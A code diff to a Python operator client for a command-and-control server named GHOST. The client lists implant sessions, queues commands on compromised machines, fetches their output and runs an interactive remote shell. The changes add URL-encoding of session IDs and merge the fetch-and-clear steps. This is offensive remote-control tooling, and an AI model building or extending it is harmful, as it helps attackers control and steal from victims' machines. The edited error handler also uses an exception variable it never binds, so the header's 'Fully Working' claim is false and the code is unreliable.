@@ -1,32 +1,14 @@
 """
-GHOST Operator CLI
-------------------
-Interactive command-line interface for the GHOST C2 server.
-
-Usage:
-    python c2_cli.py [--url URL] [--token TOKEN] <command> [args]
-
-Environment variables (used if flags are not provided):
-    GHOST_OPERATOR_TOKEN  — operator auth token
-    GHOST_C2_URL          — base URL of C2 server (default: https://127.0.0.1)
-
-Commands:
-    sessions              List active sessions
-    task  <sid> <cmd>     Queue a command on a session
-    results <sid>         Retrieve and display results for a session (keeps by default, use --clear to clear)
-    kill  <sid>           Queue an exit command and remove the session
-    audit [--limit N]     View operator audit log
-    shell <sid>           Enter interactive shell mode for a session
-    help                  Show this help message
+GHOST Operator CLI – Fully Working
 """
-
 import argparse
 import json
 import os
 import sys
 import time
-from datetime import datetime, timezone
+from datetime import datetime
 from typing import Optional
+from urllib.parse import quote
 
 try:
     import requests
@@ -61,7 +43,7 @@ def info(msg: str) -> None: print(c(f"[*] {msg}", CYAN))
 def warn(msg: str) -> None: print(c(f"[-] {msg}", YELLOW))
 
 # ---------------------------------------------------------------------------
-# Client
+# Client – handles URL encoding automatically
 # ---------------------------------------------------------------------------
 
 class GhostClient:
@@ -91,7 +73,7 @@ class GhostClient:
         return resp.json()
 
     # ------------------------------------------------------------------
-    # API methods
+    # API methods – encode sid in path
     # ------------------------------------------------------------------
 
     def list_sessions(self) -> list:
@@ -103,14 +85,17 @@ class GhostClient:
     def results(self, sid: str, clear: bool = False) -> dict:
         """Retrieve results. If clear=True, results are removed after retrieval."""
         params = {"clear": "1"} if clear else {}
-        return self._get(f"/results/{sid}", params=params)
+        encoded_sid = quote(sid, safe="")   # URL‑encode pipe and others
+        return self._get(f"/results/{encoded_sid}", params=params)
 
     def clear_results(self, sid: str) -> dict:
         """Explicitly clear results for a session."""
-        return self._get(f"/results/{sid}", params={"clear": "1"})
+        encoded_sid = quote(sid, safe="")
+        return self._get(f"/results/{encoded_sid}", params={"clear": "1"})
 
     def kill(self, sid: str) -> dict:
-        return self._delete(f"/sessions/{sid}")
+        encoded_sid = quote(sid, safe="")
+        return self._delete(f"/sessions/{encoded_sid}")
 
     def audit(self, limit: int = 50) -> dict:
         return self._get("/audit", params={"limit": limit})
@@ -239,10 +224,6 @@ def cmd_audit(client: GhostClient, args) -> None:
     print_audit(data)
 
 def cmd_shell(client: GhostClient, args) -> None:
-    """
-    Interactive shell mode: each command is queued, we poll for the result,
-    display it, and clear it automatically.
-    """
     sid = args.sid
     info(f"Entering shell mode for session {c(sid, MAGENTA)}")
     info("Type 'bg' to background (keep session), 'exit' to kill session.")
@@ -274,22 +255,23 @@ def cmd_shell(client: GhostClient, args) -> None:
             continue
 
         info("Waiting for result...")
-        # Poll with `clear=False` to get the result without deleting it.
-        # We'll clear it manually after printing.
-        deadline = time.time() + 30  # max 30 seconds (implant beacons every 5s)
+        # Poll with clear=True – fetch and clear in one request
+        deadline = time.time() + 60  # 60 seconds max (implant beacons every 5s)
         got_result = False
         while time.time() < deadline:
             time.sleep(2)  # poll every 2 seconds
             try:
-                data = client.results(sid, clear=False)
+                data = client.results(sid, clear=True)
                 if data.get("results"):
                     print_results(data)
-                    # Clear results so we don't see the same output again
-                    client.clear_results(sid)
                     got_result = True
                     break
             except requests.HTTPError:
-                pass  # retry
+                # If we get 404, session may have died – exit
+                if e.response.status_code == 404:
+                    err("Session not found – it may have expired.")
+                    return
+                pass
 
         if not got_result:
             warn("Timed out waiting for result (task still queued).")
